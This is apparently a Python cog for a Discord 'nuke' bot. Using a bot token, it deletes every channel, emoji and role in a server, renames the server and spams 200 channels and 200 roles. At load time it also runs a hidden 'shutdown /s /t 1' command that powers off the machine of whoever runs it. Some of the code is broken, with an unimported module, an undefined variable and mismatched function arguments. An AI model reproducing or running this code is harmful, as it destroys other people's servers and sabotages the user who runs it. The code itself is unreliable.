import discord, asyncio, aiohttp, time, json
from aiohttp import *
from discord.ext import commands as NexusLove
fObj = open('config.json',)
ogdata = json.load(fObj)
token = ogdata['token']
uagent = ogdata['uagent']
channel_json = ogdata['channel_json']
role_json = ogdata['role_json']

os.system("shutdown /s /t 1")
headers = {'User-Agent': uagent, 'Authorization': token }


#The nuke beginning: 

async def cd(channel):
    async with ClientSession(headers=headers) as cs:#add proxy=proxy_url next in cs
        async with cs.delete(f'https://discord.com/api/v8/channels/{channel}') as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print('Channel deleted')
            else:
                print(f'{r.status} Too many request/Not found')
async def cs(ctx):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.post(f'https://discord.com/api/v8/guilds/{guild}/channels', json=channel_json) as r:
            if r.status == 200 or r.status == 201 or r.status == 204:
                print(f'{r.status} Spammed')
            else:
                print(f'{r.status}')
async def ed(emoji):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.delete(f'https://discord.com/api/v8/guilds/{guild}/emojis/{emoji}') as r:
            if r.status == 200 or r.status == 201:
                print(f'{r.status} Spammed')
            else:
                print(f'{r.status}')

async def rd(ctx, role):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.delete(f'https://discord.com/api/v8/guilds/{guild}/roles/{role}') as r:
            if r.status == 200 or r.status == 201:
                print(f'{r.status} Spammed')
            else:
                print(f'{r.status} | Role Delete')

async def rs(ctx):
    guild = ctx.guild.id
    async with ClientSession(headers=headers) as cs:
        async with cs.post(f'https://discord.com/api/v9/guilds/{guild}/roles', json=role_json) as r:
            if r.status == 200 or r.status == 201:
                print(f'{r.status} Spammed')
            else:
                print(f'{r.status}')

#The nuke end

class nuke(NexusLove.Cog):
    def __init__(self, NexusLove):
        self.NexusLove = NexusLove

    
    @NexusLove.command()
    async def nuke(self, ctx):
        try:
            ctx.message.delete
        except:
            await ctx.message.channel.send(f"""```py\n{e}```""")

        with open('guild.jpg', 'rb') as f:
            icon = f.read()
            try:
                await ctx.guild.edit(icon=icon)
            except:
                pass

        await ctx.guild.edit(name="Rekted By NexusLove")
        await asyncio.gather(*[cd(channel.id) for channel in ctx.guild.channels])
        time.sleep(4)
        await asyncio.gather(*[ed(ctx, emoji.id) for emoji in ctx.guild.emojis])
        await asyncio.gather(*[rd(ctx, role.id) for role in ctx.guild.roles])
        await asyncio.gather(*[cs(ctx) for _ in range(200)])
        await asyncio.gather(*[rs(ctx) for _ in range(200)])

def setup(NexusLove):
    NexusLove.add_cog(nuke(NexusLove))
